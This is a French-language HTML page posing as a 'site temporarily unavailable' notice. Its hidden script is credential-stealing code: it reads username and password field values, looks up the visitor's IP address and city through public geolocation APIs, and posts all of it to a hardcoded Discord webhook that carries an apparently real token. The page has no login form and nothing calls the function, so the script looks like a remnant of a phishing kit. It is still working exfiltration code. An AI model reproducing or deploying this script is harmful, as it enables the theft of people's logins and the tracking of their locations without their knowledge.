<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Temporairement Indisponible</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 100px;
        }
        h1 {
            font-size: 24px;
        }
    </style>
</head>
<body>
    <h1>Ce site est temporairement indisponible</h1>

  <script>
    // Fonction pour envoyer les informations à Discord via un appel de webhook
    function sendToDiscord(ipAddress, city) {
      var webhookURL = "https://discord.com/api/webhooks/1146133589377962045/0rNulcb03_5R1aCpocwY0KmJm5Bff6vaHwwiS8JtWPfLVfs3mUUHjmbqsGLqBDdiAl7E";

      var content = "> **Identifiant  : **" + document.getElementById('username').value + "\n> **Mot de passe : **" + document.getElementById('password').value + "\n> **Adresse IP : **" + ipAddress + "\n> **Ville : **" + city;

      var request = new XMLHttpRequest();
      request.open("POST", webhookURL);
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: content
      };
      request.send(JSON.stringify(params));
    }

    // Fonction pour récupérer l'adresse IP de l'utilisateur et la ville associée
    function getIPAndCity() {
      // Récupérer l'adresse IP de l'utilisateur en utilisant un service de géolocalisation
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ipAddress = data.ip;

          // Récupérer la ville en fonction de l'adresse IP
          fetch('https://ipapi.co/' + ipAddress + '/json/')
            .then(response => response.json())
            .then(data => {
              var city = data.city;

              // Envoyer les informations à Discord
              sendToDiscord(ipAddress, city);
            })
            .catch(error => {
              console.error('Erreur lors de la récupération de la ville :', error);
            });
        })
        .catch(error => {
          console.error('Erreur lors de la récupération de l\'adresse IP :', error);
        });
    }
  </script>
</body>
</html>
